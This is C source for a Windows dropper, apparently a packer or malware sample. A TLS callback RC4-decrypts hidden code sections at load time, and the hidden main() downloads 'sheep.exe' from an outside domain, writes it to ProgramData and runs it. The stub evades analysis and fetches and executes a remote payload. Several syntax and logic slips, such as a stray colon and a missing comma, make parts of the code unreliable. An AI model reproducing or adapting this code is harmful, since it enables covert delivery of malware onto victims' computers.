#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <windows.h>
#include <winhttp.h>

#pragma section(".tls1", read)
__declspec(allocate(".tls1")) const char RC4_KEY[] = "680d150e-23fe-4216-9bbb-7c1c101dda72";

#pragma code_seg(push, r1, ".tls2")
void rc4(uint8_t *ciphertext, size_t ciphertext_size, const uint8_t *key, size_t key_size) {
   uint8_t sbox[256];

   for (size_t i=0; i<256; ++i)
      sbox[i] = i;

   size_t j = 0;
   
   for (size_t i=0; i<256; ++i) {
      j = (j + sbox[i] + key[i % key_size]) % 256;
      uint8_t tmp = sbox[i];
      sbox[i] = sbox[j];
      sbox[j] = tmp;
   }

   j = 0;
   
   for (size_t i=0; i<ciphertext_size; ++i) {
      size_t k = (i + 1) % 256;
      j = (j + sbox[k]) % 256;
      uint8_t tmp = sbox[k];
      sbox[k] = sbox[j];
      sbox[j] = tmp;
      ciphertext[i] ^= sbox[(sbox[j] + sbox[k]) % 256];
   }
}

PIMAGE_SECTION_HEADER get_section_table(uint8_t *bin_data) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bin_data;
   PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)&bin_data[dos_header->e_lfanew+sizeof(DWORD)];
   PIMAGE_SECTION_HEADER section_table = (PIMAGE_SECTION_HEADER)&bin_data[dos_header->e_lfanew+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+file_header->SizeOfOptionalHeader];

   return section_table;
}

bool decrypt_section(uint8_t *bin_data, const char *section, const char *key) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bin_data;
   PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)&bin_data[dos_header->e_lfanew+sizeof(DWORD)];
   PIMAGE_SECTION_HEADER section_table = get_section_table(bin_data);

   for (size_t i=0; i<file_header->NumberOfSections; ++i) {
      if (memcmp(&section_table[i].Name[0], &section[0], strlen(section)) != 0)
         continue;

      rc4(&bin_data[section_table[i].PointerToRawData], section_table[i].SizeOfRawData, (const uint8_t *)key, strlen(key));

      return true;
   }

   return false;
}

IMAGE_NT_HEADERS64 original_nt_headers(HMODULE module) {
   char filename[MAX_PATH+1];
   memset(&filename[0], 0, MAX_PATH+1);
   GetModuleFileNameA(module, &filename[0], MAX_PATH);
   HANDLE file_handle = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   uint8_t temp_buff[0x1000];
   DWORD bytes_read;
   ReadFile(file_handle, temp_buff, 0x1000, &bytes_read, NULL);
   CloseHandle(file_handle);
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)&temp_buff[0];
   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)&temp_buff[dos_header->e_lfanew];
   IMAGE_NT_HEADERS64 ret;
   memcpy(&ret, nt_headers, sizeof(IMAGE_NT_HEADERS64));

   return ret;
}

void relocate_section(uint8_t *bin_data, const char *section, uintptr_t from_base, uintptr_t to_base) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bin_data;
   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)&bin_data[dos_header->e_lfanew];
   PIMAGE_SECTION_HEADER section_table = get_section_table(bin_data);
   uint32_t reloc_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
   PIMAGE_SECTION_HEADER target_section = NULL;

   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i) {
      if (memcmp(&section_table[i].Name[0], &section[0], strlen(section)) == 0) {
         target_section = &section_table[i];
         break;
      }
   }

   assert(target_section != NULL);
   
   uintptr_t delta = to_base - from_base;
   uint8_t *base_reloc = &bin_data[reloc_rva];

   while (((PIMAGE_BASE_RELOCATION)base_reloc)->VirtualAddress != 0) {
      PIMAGE_BASE_RELOCATION base_block = (PIMAGE_BASE_RELOCATION)base_reloc;
      uint16_t *entry_table = (uint16_t *)&base_reloc[sizeof(IMAGE_BASE_RELOCATION)];
      size_t entries = (base_block->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(uint16_t);

      for (size_t i=0; i<entries; ++i) {
         uint32_t reloc_rva = base_block->VirtualAddress + (entry_table[i] & 0xFFF);

         if (reloc_rva < target_section->VirtualAddress || reloc_rva >= target_section->VirtualAddress+target_section->Misc.VirtualSize)
            continue;
         
         uintptr_t *reloc_ptr = (uintptr_t *)&bin_data[reloc_rva];

         if ((entry_table[i] >> 12) == IMAGE_REL_BASED_DIR64)
            *reloc_ptr += delta;
      }

      base_reloc += base_block->SizeOfBlock;
   }
}

VOID WINAPI decrypt_sheep(PVOID dll_handle, DWORD reason, PVOID reserved) {
   static bool decrypted = false;

   if (decrypted)
      return;

   uint8_t *bin_data = (uint8_t *)dll_handle;
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bin_data;
   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS)&bin_data[dos_header->e_lfanew];
   PIMAGE_SECTION_HEADER section_table = get_section_table(bin_data);
   PIMAGE_SECTION_HEADER etext, edata;
   etext = NULL;
   edata = NULL;

   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i) {
      if (memcmp(&section_table[i].Name[0], ".etext", strlen(".etext")) == 0)
         etext = &section_table[i];
      else if (memcmp(&section_table[i].Name[0], ".edata", strlen(".edata")) == 0)
         edata = &section_table[i];
   }

   assert(etext != NULL && edata != NULL);
   DWORD old_etext, old_edata;
   
   assert(VirtualProtect(&bin_data[etext->VirtualAddress], etext->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old_etext));
   assert(VirtualProtect(&bin_data[edata->VirtualAddress], edata->Misc.VirtualSize, PAGE_READWRITE, &old_edata));
   
   IMAGE_NT_HEADERS64 original_headers = original_nt_headers((HMODULE)dll_handle);
   
   relocate_section(bin_data, ".etext", (uintptr_t)bin_data, original_headers.OptionalHeader.ImageBase);
   relocate_section(bin_data, ".edata", (uintptr_t)bin_data, original_headers.OptionalHeader.ImageBase);
   rc4(&bin_data[etext->VirtualAddress], etext->SizeOfRawData, (const uint8_t *)RC4_KEY, strlen(RC4_KEY));
   rc4(&bin_data[edata->VirtualAddress], edata->SizeOfRawData, (const uint8_t *)RC4_KEY, strlen(RC4_KEY));
   relocate_section(bin_data, ".etext", original_headers.OptionalHeader.ImageBase, (uintptr_t)bin_data);
   relocate_section(bin_data, ".edata", original_headers.OptionalHeader.ImageBase, (uintptr_t)bin_data);

   DWORD new_etext, new_edata;
   assert(VirtualProtect(&bin_data[etext->VirtualAddress], etext->Misc.VirtualSize, old_etext, &new_etext));
   assert(VirtualProtect(&bin_data[edata->VirtualAddress], edata->Misc.VirtualSize, old_edata, &new_edata));

   decrypted = true;
}

#pragma code_seg(pop, r1)

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:decrypt_callback")
#pragma const_seg(push, c1, ".CRT$XLAAA")
const PIMAGE_TLS_CALLBACK decrypt_callback = decrypt_sheep;
#pragma const_seg(pop, c1)

#pragma code_seg(push, r1, ".etext")
#pragma const_seg(push, c1, ".edata")
HINTERNET init_winhttp(void) {
   return WinHttpOpen(L"Amethyst Labs/1.0"
                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME,
                      WINHTTP_NO_PROXY_BYPASS,
                      0);
}

uint8_t *wget(HINTERNET session, const wchar_t *verb, const wchar_t *domain, const wchar_t *url, size_t *out_size) {
   HINTERNET connection = WinHttpConnect(session,
                                         domain,
                                         INTERNET_DEFAULT_HTTPS_PORT,
                                         0);

   if (connection == NULL)
      return NULL;

   HINTERNET request = WinHttpOpenRequest(connection,
                                          verb,
                                          url,
                                          NULL,
                                          WINHTTP_NO_REFERRER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);

   if (request == NULL)
      return NULL;

   bool results = WinHttpSendRequest(request,
                                     WINHTTP_NO_ADDITIONAL_HEADERS,
                                     0,
                                     WINHTTP_NO_REQUEST_DATA,
                                     0,
                                     0,
                                     0);

   if (!results)
      return NULL;

   results = WinHttpReceiveResponse(request, NULL);

   if (!results)
      return NULL;

   *out_size = 0;
   uint32_t chunk = 0;
   uint8_t *out_buff = NULL;
   uint32_t downloaded;

   if (!WinHttpQueryDataAvailable(request, &chunk))
      return NULL;

   while (chunk > 0) {
      if (*out_size == 0)
         out_buff = (uint8_t *)malloc(chunk);
      else
         out_buff = (uint8_t *)realloc(out_buff, *out_size+chunk);

      memset(&sheep_buff[*out_size], 0, chunk);
      *out_size += chunk;

      if (!WinHttpReadData(request, &out_buff[*out_size-chunk], chunk, &downloaded))
         return NULL;

      if (!WinHttpQueryDataAvailable(request, &chunk))
         return NULL;
   }

   return out_buff;
}
                      
int main(int argc, char *argv[]) {
   HINTERNET session = init_winhttp();

   if (session == NULL)
      return 1;

   size_t sheep_size = 0:
   uint8_t *sheep_buff = wget(session, L"GET", L"amethyst.systems", L"/sheep.exe", &sheep_size);
   assert(sheep_buff != NULL);

   HANDLE sheep_handle = CreateFileA("C:\\ProgramData\\sheep.exe",
                                     GENERIC_WRITE,
                                     0,
                                     NULL,
                                     CREATE_ALWAYS,
                                     FILE_ATTRIBUTE_NORMAL,
                                     NULL);
   assert(sheep_handle != INVALID_HANDLE_VALUE);
   
   DWORD bytes_written;
   assert(WriteFile(sheep_handle, sheep_buff, sheep_size, &bytes_written, NULL));

   STARTUPINFOA startup_info;
   memset(&startup_info, 0, sizeof(STARTUPINFOA));
   startup_info.cb = sizeof(STARTUPINFOA);
   PROCESS_INFORMATION proc_info;
   memset(&proc_info, 0, sizeof(PROCESS_INFORMATION));
   
   assert(CreateProcessA("C:\\ProgramData\\sheep.exe",
                         NULL,
                         NULL,
                         NULL,
                         false,
                         0,
                         NULL,
                         NULL,
                         &startup_info,
                         &proc_info));

   return 0;
}
#pragma code_seg(pop, r1)
#pragma const_seg(pop, c1)
